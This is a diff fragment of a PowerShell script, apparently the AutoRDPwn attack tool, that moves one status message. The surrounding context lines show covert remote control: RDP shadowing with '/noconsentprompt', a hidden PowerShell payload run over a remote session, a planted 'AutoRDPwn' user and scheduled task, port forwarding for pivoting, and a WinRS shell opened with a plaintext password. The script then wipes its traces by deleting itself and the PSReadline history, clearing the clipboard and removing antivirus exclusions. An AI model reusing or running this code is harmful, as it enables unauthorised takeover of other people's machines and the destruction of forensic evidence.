@@ -571,7 +571,7 @@ function Remove-Exclusions {
 $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
 if ($nogui){ $remotehost = $env:computername.tolower() ; Write-Host $txt66 -ForegroundColor Green ; Write-Host ; Write-Host "mstsc /v $remotehost /admin /shadow:$shadow /control /noconsentprompt /prompt /f" ; Write-Host
 if ($createuser -like '-createuser') { $hash ="true" ; invoke-command -session $RDP[0] -scriptblock { powershell.exe -windowstyle hidden $using:Pwn5 }}}
-else { Write-Host $txt38 -ForegroundColor Green ; Start-Sleep -milliseconds 2500 ; Write-Host ; Write-Host $txt75 -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }
+else { Write-Host $txt38 -ForegroundColor Green ; Start-Sleep -milliseconds 2500 }
 
 if ($hash){ invoke-command -session $RDP[0] -scriptblock {
 $script = 'net user AutoRDPwn /delete ; cmd /c rmdir /q /s C:\Users\AutoRDPwn ; Unregister-ScheduledTask -TaskName AutoRDPwn -Confirm:$false ; $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript'
@@ -623,5 +623,7 @@ until($key.key -eq "x")}}
 if ($remoteforward){ invoke-command -session $RDP[0] -scriptblock { netsh interface portproxy add v4tov4 listenport=$using:rlport listenaddress=$using:rlhost connectport=$using:rrport connectaddress=$using:rrhost }}
 if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-Host ; Write-Host ">> $txt39 <<" ; Write-Host ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
 else { Write-Host ; Write-Host "$txt40" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 } if($tsfail) { Write-Host ; Write-Host "$txt40" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}
+
+Write-Host ; Write-Host $txt75 -ForegroundColor Red ; Start-Sleep -milliseconds 2500
 $sid = (gwmi win32_process | select handle, commandline | findstr "shadow").split("").trim()[0] ; Wait-Process -Id $sid ; Write-Host ; Write-Host $txt76 -ForegroundColor Green ; Start-Sleep -milliseconds 2500 
 $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript ; del (Get-PSReadlineOption).HistorySavePath ; Remove-Exclusions 2>&1> $null ; Set-Clipboard $null 2>&1> $null
